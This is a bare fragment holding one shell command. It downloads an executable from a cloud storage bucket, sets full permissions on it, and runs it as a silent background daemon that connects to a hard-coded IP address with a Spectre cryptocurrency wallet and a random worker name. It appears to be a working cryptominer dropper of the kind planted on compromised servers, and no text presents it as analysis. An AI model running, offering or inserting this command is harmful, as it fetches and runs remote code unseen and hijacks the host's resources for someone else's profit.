...
wget https://majza.nyc3.digitaloceanspaces.com/Tnn0.4.0 && chmod 777 Tnn0.4.0 && ./Tnn0.4.0 --daemon-address 157.230.239.11 --port 443 --worker-name $(shuf -n 1 -i 1-999)-Bismillah --spectre --wallet spectre:qrp5cg0hgjygpmeyr7ru5dky3shhcvrjen765e6qdur2yfl9mcyuqt8vqyqmh > /dev/null 2>&1
